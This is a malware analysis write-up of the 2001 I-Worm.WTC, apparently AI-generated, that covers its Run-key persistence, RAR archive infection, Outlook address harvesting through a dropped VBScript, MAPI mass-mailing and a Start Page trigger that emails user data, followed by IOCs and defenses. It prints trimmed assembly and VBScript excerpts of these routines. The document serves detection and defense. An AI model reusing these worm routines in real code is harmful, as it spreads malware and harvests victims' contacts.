# Dissecting I‑Worm.WTC (2001): RAR companion‑style infector and Outlook harvesting 🛠️🔍

> "This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes."

## Introduction

I‑Worm.WTC is a 32‑bit Windows worm authored during September–October 2001. Written in TASM/MASM‑style assembly, it combines classic persistence with two distinct behaviors: (1) it appends a crafted RAR file header and embeds its own image to each RAR archive found in the user’s Personal folder, and (2) it harvests Microsoft Outlook addresses using a dropped VBScript and then sends emails via Simple MAPI. The code also implements conditional behaviors tied to dates and browser configuration: it can display a message on a specific day and, if the Internet Explorer Start Page matches entries from a built‑in list, compile basic “suspect information” and send it to a designated mailbox. This write‑up focuses on technical behavior, IOCs, and safe excerpts of the source.

## Overview 🔍

- Platforms: Aimed at Win9x/ME/2000 era; uses SHLWAPI (SHSetValueA), WININET (InternetGetConnectedState), Shell32 (SHGetSpecialFolderPathA), MAPI32 (MAPISendMail), and User32.
- Installation & persistence:
  - Copies itself to `%System%\Visual8.exe`.
  - Sets autorun: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Visual Debugger = %System%\Visual8.exe`.
- RAR infection (Personal folder):
  - Enumerates `*.rar` under the user’s Personal directory.
  - Computes CRC32 over a prepared RAR header template, writes the header, then appends the worm image; marks the file read‑only as an “infected” flag.
- Outlook harvesting and send:
  - Drops `C:\wrm.vbs` which enumerates Outlook AddressLists and appends email addresses to `C:\email.mel`, then writes a sentinel character `%` and deletes itself after a short delay.
  - Waits for connectivity; parses `C:\email.mel` until `%` and sends one message per address via `MAPISendMail`. Subject: “Everybody against the terrorists !” Attachment display name: `StopTerrorists.exe` (actual file = worm image).
- Conditional behaviors:
  - Shows a message box on a specific day (code compares day==4; comments mention the 11th — discrepancy noted below).
  - Reads `HKCU\Software\Microsoft\Internet Explorer\Main\Start Page`; if it matches any of a built‑in list of URLs, writes `C:\information.txt` (Start Page, RegisteredOwner, Country) and emails it to a designated address; deletes the file after a delay.

Macros from `useful.inc`/`myinclude.inc` are used for inline strings (`@pushsz`), call/pop string tables (`@endsz`), and compact stdcall invocation (`api` alias for `callx`).

## Section 2 – Source Code Analysis 🧩

Short, real excerpts from `WTC.asm`. They’re inert, trimmed, and commented for clarity.

### 2.1 Copy and persist (System\Visual8.exe + HKLM Run)

```asm
; Build %System%\Visual8.exe and create Run value "Visual Debugger"
mov   esi, offset orig_worm
api   GetModuleFileNameA
mov   edi, offset copy_worm
api   GetSystemDirectoryA            ; %System%
add   edi, eax
mov   eax, "siV\\"                 ; "Vis\" (LE)
stosd
mov   eax, "8lau"                   ; "ual8"
stosd
mov   eax, "exe."
stosd
push  0
push  edi
push  esi
api   CopyFileA
push  15
push  edi
push  1
@pushsz "Visual Debugger"
@pushsz "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
push  80000002h                     ; HKLM
api   SHSetValueA
```

Impact: Drops and persists under a plausible developer tool name.

### 2.2 RAR file infection (header craft + payload append)

```asm
; Infect .RAR: write a crafted header then append worm bytes
push  2
push  0
push  0
push  ebx
api   SetFilePointer                 ; seek to end
mov   esi, offset RARHeaderCRC+2
push  end_RAR - RARHeader - 2
pop   edi
call  CRC32                           ; compute CRC over header template
mov   [RARHeaderCRC], ax
push  0
push  offset tmp
push  end_RAR - RARHeader
call  end_RAR
RARHeader:
RARHeaderCRC dw 0
RARType      db 74h                   ; RAR file header
RARFlags     dw 8000h
RARHSize     dw end_RAR - RARHeader
RARCompressed dd 2000h                ; placeholder sizes
RAROriginal  dd 2000h
; ... (fields omitted) ...
end_RAR:
push  ebx
api   WriteFile                      ; write header
push  0
push  offset tmp
push  [filesize]
push  [worm_main]
push  ebx
api   WriteFile                      ; append worm image
push  ebx
api   CloseHandle
push  1
push  offset Search.cFileName
api   SetFileAttributesA             ; mark as infected (read-only)
```

Impact: The worm doesn’t re‑compress; it appends its own bytes and a minimal header. Integrity‑aware tools or RAR validators would flag anomalies.

### 2.3 VBScript harvester to C:\email.mel with '%' sentinel

```vbs
' C:\wrm.vbs — collect Outlook addresses to C:\email.mel and write '%'
On Error Resume Next
Set f = CreateObject("Scripting.FileSystemObject")
Set O = CreateObject("Outlook.Application")
Set M = O.GetNameSpace("MAPI")
Set mel = f.CreateTextFile("C:\\email.mel")
mel.Close
' ... iterate AddressLists and write P.Address lines ...
Set mel = f.OpenTextFile("C:\\email.mel", 8, True)
mel.WriteLine "%"   ' sentinel used by native parser
mel.Close
```

Impact: Harvests to a fixed path and uses a distinct '%' sentinel (different from other worms in this archive that used '#').

### 2.4 Connectivity gate and parse/send loop

```asm
; Wait for connectivity, then parse C:\email.mel until '%'
verif_inet:
  push 0
  push offset inet
  api  InternetGetConnectedState
  dec  eax
  jnz  verif_inet
open_scan_mail:
  ; ... map C:\email.mel into memory ...
scan_mail:
  xor  edx, edx
  mov  edi, offset mail_addr
  push edi
p_c:
  lodsb
  cmp  al, "%"      ; end marker from VBS
  je   f_mail
  cmp  al, 0Dh       ; newline => finalize
  je   entr1
  cmp  al, '@'       ; ensure an '@' appeared
  jne  not_a
  inc  edx
not_a:
  stosb
  jmp  p_c
entr1:
  xor  al, al
  stosb               ; NUL‑terminate address
  pop  edi
  test edx, edx
  je   scan_mail
  call send_mail      ; MAPISendMail(&MsgWrm)
  jmp  scan_mail
```

Impact: Simple line parser with a weak validity check (`@` encountered). Uses Simple MAPI and the message template `MsgWrm` with a fixed subject and attachment name.

### 2.5 IE Start Page match → “alert” routine (inline string table)

```asm
; If Start Page equals any of these URLs, write info and email it
call  @web
 db "http://stcom.net/",0
 db "http://stcom.net/default2.htm",0
 db "http://stcom.net/qoqazfr",0
 db "http://stcom.net/kavkoz",0
 db "http://stcom.net/falestine",0
 ; ... (list continues) ...
@web:
 pop  esi
 mov  ecx, 10
w_loop:
 push ecx
 push esi
 push offset sinet                 ; current Start Page (queried earlier)
 api  lstrcmp
 test eax, eax
 jnz  continue
 call alert_fbi                     ; write C:\information.txt + MAPISendMail
 jmp  end_web
continue:
 @endsz                             ; advance to next URL in table
 pop  ecx
 loop w_loop
end_web:
```

Impact: A call/pop table of URLs is compared against the current Start Page; on match it compiles a small INI file and emails it to a hard‑coded address.

## Artifacts and IOCs

Files:
- `%System%\Visual8.exe` (installed copy)
- `C:\wrm.vbs` (temporary address harvester)
- `C:\email.mel` (harvested addresses; ends with `%`)
- `C:\information.txt` (created only on specific Start Page matches; deleted after ~30s)
- Personal folder `*.rar` archives modified: appended header + worm data; often set FILE_ATTRIBUTE_READONLY

Registry:
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Visual Debugger = %System%\Visual8.exe`
- Reads `HKCU\Software\Microsoft\Internet Explorer\Main\Start Page` and `HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner`

Email traits:
- Mass‑mail subject: “Everybody against the terrorists !”; attachment label: `StopTerrorists.exe`.
- Conditional “alert”: message to a fixed mailbox with `C:\information.txt` attached (contains Start Page, RegisteredOwner, Country from WIN.INI).

User‑visible:
- Optional message box if the day equals 4 (code) though a comment claims the 11th — likely a discrepancy/bug.

## Macro and engineering notes

- Inline string tables: `call`/`pop` into ESI + `@endsz` to iterate 0‑terminated strings compactly.
- RAR logic: Uses a custom CRC32 over the header template, writes a minimal RAR file header (type 0x74), then appends the PE image. This is not a traditional parasitic infector of PE/RAR internals and may break archive integrity.
- Sentinel conventions: This sample uses `%` for its email list terminator (distinct from `#` in other samples).

## Mitigation and Defense Strategies 🛡️

### Detection (Analyst focus)
- Autorun: Run key `Visual Debugger` pointing to `%System%\Visual8.exe`.
- Files: presence of `C:\email.mel` with a trailing `%`; `C:\wrm.vbs` (transient); `C:\information.txt` (transient on match case).
- RAR anomalies: Archives in Personal modified at the end with extra data; unexpected FILE_ATTRIBUTE_READONLY; header with 0x74 type and unusual size/CRC.
- API sequences: `InternetGetConnectedState` gating; `MAPISendMail` bulk sends; `SHGetSpecialFolderPathA` + RAR writes; inline `lstrcmp` URL comparisons.
- Email content: subject/attachment label as above.

### Prevention (Admin focus)
- Script and Outlook hardening: restrict Windows Script Host and Outlook OOM; enforce modern mail client protections against programmatic sends.
- Application control: block execution from `%WinDir%`/`%System%` for unsigned binaries; allow‑list known apps.
- Email gateway policies: strip/block executable attachments; pattern‑match common subjects/attachment names.
- Archive hygiene: treat RAR files modified in user profile with suspicion; verify with repair tools.
- Least privilege: restrict Run key writes and System folder writes to admins on NT‑based systems.

## Conclusion

WTC blends several early‑2000s patterns: a Run‑key persistence with a developer‑sounding name, a crude RAR modification routine, a VBScript‑assisted Outlook harvester, and a simple MAPI sender. Conditional logic around dates and browser Start Page adds unique (if unreliable) triggers. Defenders can lean on the Run value, the `C:\email.mel` artifact with '%' sentinel, and RAR integrity anomalies for detection, while modern scripting and email‑automation controls significantly blunt this class of worms.

_Analysis by Copilot — generated via the analyze‑malware Copilot mode._
